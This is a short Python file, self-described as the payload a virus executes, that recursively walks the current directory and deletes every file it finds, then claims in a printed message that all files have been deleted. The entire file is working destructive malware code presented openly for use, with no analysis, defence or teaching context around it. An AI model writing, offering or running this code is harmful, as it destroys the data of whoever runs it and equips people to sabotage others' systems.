# payload.py - This file contains the payload that the virus will execute.

import os

# Function to delete all files in the current directory.
def delete_files():
    for root, dirs, files in os.walk('.'):
        for file in files:
            os.remove(os.path.join(root, file))

# Function to display a payload message.
def display_payload_message():
    print("Payload executed: All files have been deleted!")

# Main function to execute the payload.
def main():
    # Display the payload message.
    display_payload_message()

    # Delete all files in the current directory.
    delete_files()

if __name__ == "__main__":
    main()